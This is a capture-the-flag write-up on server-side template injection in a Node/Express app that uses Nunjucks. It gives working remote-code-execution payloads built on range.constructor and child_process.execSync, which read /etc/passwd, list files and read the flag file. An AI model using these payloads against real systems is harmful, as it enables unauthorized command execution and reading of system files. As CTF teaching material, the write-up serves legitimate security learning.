# Hey h3ck3r!

Description: May I know your name?
Author: [Av4nth1ka](https://twitter.com/AvanthikaAnand1?t=U4sSUyEOg7VPPZ_0S6LybQ&s=09)

Solution:

So, this is a very basic Node Server-Side Template Injection challenge.

First we get a page with a field to enter our username.

So, if we enter any name in the username field we get a message as “Hello <your-name>”.

So, we can see that whatever contents we give in the field will be displayed along with Hello.

So, a thing which we can try in such cases is SSTI.

Lets try a basic payload: {{2*2}}

Yes!! We can confirm that this page is vulnerable to SSTI from the above case. Looking at the response headers, we can see there is a header as **`x-powered-by:** Express`

So, we know that Express is a node-js web application framework. So this a node SSTI vulnerability. Next we need to find which template this application is using in order to craft payload.

There is a number of templates in Nodejs. Lets try with a payload of any template.

I got an error like this:

Template render error: (unknown path) [Line 6, Column 23]
  unexpected token: :
    at Object._prettifyError (/node_modules/nunjucks/src/lib.js:36:11)
    at Template.render (/node_modules/nunjucks/src/environment.js:538:21)
    at Environment.renderString (/node_modules/nunjucks/src/environment.js:380:17)
    at Object.renderString (/node_modules/nunjucks/index.js:99:14)
    at getHTML (/home/index.js:18:21)
    at app.post (/home/index.js:27:16)
    at Layer.handle [as handle_request] (/node_modules/express/lib/router/layer.js:95:5)
    at next (/node_modules/express/lib/router/route.js:144:13)
    at Route.dispatch (/node_modules/express/lib/router/route.js:114:3)
    at Layer.handle [as handle_request] (/node_modules/express/lib/router/layer.js:95:5)

There was an error in rendering the template. Also we can see something called `nunjucks`. When we search for it, we can see that it a template in node-js vulnerable to SSTI.

Read more about nunjucks: 

Lets try using the following payload to dump the data in /etc/passwd.

payload:  `{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /etc/passwd')")()}}`

We get the following output:
```
 Hello root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false node:x:1000:1000::/home/node:/bin/bash
 ```

So, yeah our payload works now! Lets try to dump the files in the current directory, Now we need to find where the flag is located.

payload: `{{range.constructor("return global.process.mainModule.require('child_process').execSync('ls')")()}}`

So, we got the files in the current directory.

`Dockerfile flag index.js node package-lock.json package.json`

Lets try to print the contents in the flag file.

payload: `{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat flag')")()}}`

So we got the flag!!

Flag: `shaktictf{ohh!!!_nuunjucksssss_ssti}`
